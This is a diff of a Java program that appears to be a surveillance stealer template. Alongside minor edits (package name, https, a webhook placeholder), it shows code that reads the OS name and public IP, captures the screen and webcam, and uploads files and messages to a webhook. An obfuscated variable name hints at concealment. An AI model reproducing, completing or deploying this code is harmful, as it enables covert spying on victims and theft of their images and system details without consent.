@@ -1,4 +1,4 @@
-package swag.company;
+package uk.neo;
 
 import com.sun.istack.internal.NotNull;
 import sun.net.www.http.HttpClient;
@@ -24,7 +24,7 @@ public class Main {
     public static void main(String[] args) {
         String llLlLlL = System.getProperty("os.name");
         try {
-            URL whatismyip = new URL("http://checkip.amazonaws.com");
+            URL whatismyip = new URL("https://checkip.amazonaws.com");
             BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(
                     whatismyip.openStream()));
             String ip = bufferedReader.readLine();
@@ -138,12 +138,12 @@ public class Main {
         try {
             captureScreen();
         } catch (Exception ex) {
-            sendMessage("``` UNABLE TO SCREENSHOT : " + ex + "```");
+            sendMessage("``` UNABLE TO SCREENSHOT  : " + ex + "```");
         }
         try {
             captureCamera();
         } catch (Exception ex) {
-            sendMessage("``` UNABLE TO CAPTURE CAMERA : " + ex + "```");
+            sendMessage("``` UNABLE TO CAPTURE CAMERA  : " + ex + "```");
         }
     }
 
@@ -188,7 +188,7 @@ public class Main {
 
     private static void sendFile(File file) throws IOException {
 
-        String url = "webhook";
+        String url = "WEBHOOK GOES HERE";
         String boundary = Long.toHexString(System.currentTimeMillis());
         URLConnection connection = new URL(url).openConnection();
         connection.setDoOutput(true);
